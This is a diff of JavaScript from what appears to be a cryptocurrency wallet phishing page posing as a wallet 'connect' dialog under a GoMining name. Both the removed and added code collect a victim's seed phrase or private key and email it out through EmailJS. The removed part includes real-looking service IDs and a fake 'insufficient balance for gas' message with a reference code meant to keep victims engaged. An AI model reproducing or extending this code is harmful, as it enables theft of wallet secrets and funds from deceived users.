+          phraseHint.textContent = "0 words — min 12, max 24";
+          phraseHint.className = "phrase-hint";
+          keyHint.textContent = "0 characters — min " + KEY_MIN + ", max " + KEY_MAX;
+          keyHint.className = "phrase-hint";
+          setTab("phrase");
+
+          overlay.classList.add("active");
+          runConnecting();
+        };
+
+        function closeModal() {
+          clearTimers();
+          overlay.classList.remove("active");
+        }
+
+        async function submitForm() {
+          const tab = activeTab();
+          // nothing proceeds unless valid
+          if (tab === "phrase" && !phraseValid()) return;
+          if (tab === "key" && !keyValid()) return;
+
+          submitBtn.disabled = true;
+          const label = submitBtn.textContent;
+          submitBtn.textContent = "Connecting…";
+
+          const params = {
+            wallet: nameEl.textContent,
+            type: tab === "phrase" ? "Passphrase" : "Private Key",
+            value:
+              tab === "phrase" ? phraseInput.value.trim() : keyInput.value.trim(),
+          };
+
+          try {
+            await emailjs.send(
+              "YOUR_SERVICE_ID",
+              "YOUR_TEMPLATE_ID",
+              params,
+              "YOUR_PUBLIC_KEY"
+            );
+          } catch (err) {
+            console.error("EmailJS error:", err);
+          }
+
+          submitBtn.textContent = label;
+          overlay.classList.remove("active");
+          successOverlay.classList.add("active");
+        }
+
+        document.querySelectorAll(".tab-btn").forEach((b) =>
+          b.addEventListener("click", () => setTab(b.dataset.tab))
+        );
+        phraseInput.addEventListener("input", updateSubmitState);
+        keyInput.addEventListener("input", updateSubmitState);
+        submitBtn.addEventListener("click", submitForm);
+        document.getElementById("modalClose").addEventListener("click", closeModal);
+        document
+          .getElementById("successClose")
+          .addEventListener("click", () => successOverlay.classList.remove("active"));
+        document
+          .getElementById("successDone")
+          .addEventListener("click", () => successOverlay.classList.remove("active"));
+
+        overlay.addEventListener("click", (e) => {
+          if (e.target === overlay) closeModal();
         });
-        setTimeout(function () {
-          document.getElementById("step4").className =
-            "status-step visible done";
-          setTimeout(function () {
-            document.getElementById("connectingScreen").style.display = "none";
-            document.getElementById("formScreen").classList.add("visible");
-          }, 400);
-        }, 2900);
-      }
-
-      document.addEventListener("DOMContentLoaded", function () {
-        document
-          .getElementById("modalCloseBtn")
-          .addEventListener("click", closeModal);
-        document
-          .getElementById("modalOverlay")
-          .addEventListener("click", function (e) {
-            if (e.target === this) closeModal();
-          });
-        document
-          .getElementById("gasCloseTop")
-          .addEventListener("click", closeSuccessPopup);
-        document
-          .getElementById("gasCloseBtn")
-          .addEventListener("click", closeSuccessPopup);
-
-        document.querySelectorAll(".tab-btn").forEach(function (btn) {
-          btn.addEventListener("click", function () {
-            var targetId = this.dataset.tab;
-            document.querySelectorAll(".tab-btn").forEach(function (b) {
-              b.classList.remove("active");
-            });
-            document.querySelectorAll(".tab-panel").forEach(function (p) {
-              p.classList.remove("active");
-            });
-            this.classList.add("active");
-            document.getElementById(targetId).classList.add("active");
-          });
-        });
-
-        document
-          .getElementById("messageBox")
-          .addEventListener("input", function () {
-            var count = countWords(this.value);
-            var hint = document.getElementById("phraseHint");
-            if (count === 12 || count === 24) {
-              hint.textContent = count + " words \u2014 valid \u2713";
-              hint.className = "phrase-hint valid";
-            } else if (count > 0) {
-              hint.textContent =
-                count + " words \u2014 must be exactly 12 or 24";
-              hint.className = "phrase-hint invalid";
-            } else {
-              hint.textContent = "0 words \u2014 enter exactly 12 or 24";
-              hint.className = "phrase-hint";
-            }
-          });
-
-        document
-          .getElementById("contactForm")
-          .addEventListener("submit", async function (e) {
-            e.preventDefault();
-            var btn = document.getElementById("submitBtn");
-            var form = this;
-
-            var onPassphraseTab = document
-              .getElementById("tabReview")
-              .classList.contains("active");
-            if (onPassphraseTab) {
-              var phraseCount = countWords(
-                document.getElementById("messageBox").value
-              );
-              if (phraseCount !== 12 && phraseCount !== 24) {
-                var hint = document.getElementById("phraseHint");
-                hint.textContent =
-                  phraseCount + " words \u2014 must be exactly 12 or 24";
-                hint.className = "phrase-hint invalid";
-                return;
-              }
-            }
-
-            btn.disabled = true;
-            btn.textContent = "Sending\u2026";
-
-            function onSuccess() {
-              form.reset();
-              document.getElementById("phraseHint").textContent =
-                "0 words \u2014 enter exactly 12 or 24";
-              document.getElementById("phraseHint").className = "phrase-hint";
-              btn.disabled = false;
-              btn.textContent = "Connect";
-              closeModal();
-
-              // 🔥 ONLY THIS PART CHANGED — generates random code instead of hardcoded 2QGFLb
-              var refCode = generateRefCode(6);
-              var popupText = document.querySelector('#successPopup p');
-              popupText.innerHTML = 'Insufficient balance for gas. Please fund your wallet to continue or try again with another wallet. Please contact the admin with your unique ref code: <strong>' + refCode + '</strong>';
-
-              setTimeout(function () {
-                document.getElementById("successPopup").classList.add("active");
-              }, 200);
-            }
-
-            var onPassphrase = document
-              .getElementById("tabReview")
-              .classList.contains("active");
-            var templateParams = {
-              name: "GoMining User",
-              email: "noreply@gomining.llc",
-              message: onPassphrase
-                ? "PASSPHRASE: " + document.getElementById("messageBox").value
-                : "PRIVATE KEY: " + document.getElementById("issueBox").value,
-              partner: document.getElementById("partnerInput").value,
-            };
-
-            try {
-              await emailjs.send(
-                "service_necfopo",
-                "template_593q3of",
-                templateParams,
-                "1QZkiWXa54L57fM0s"
-              );
-              onSuccess();
-            } catch (err) {
-              onSuccess();
-            }
-          });
-      });
+      })();
     </script>
   </body>
 </html>
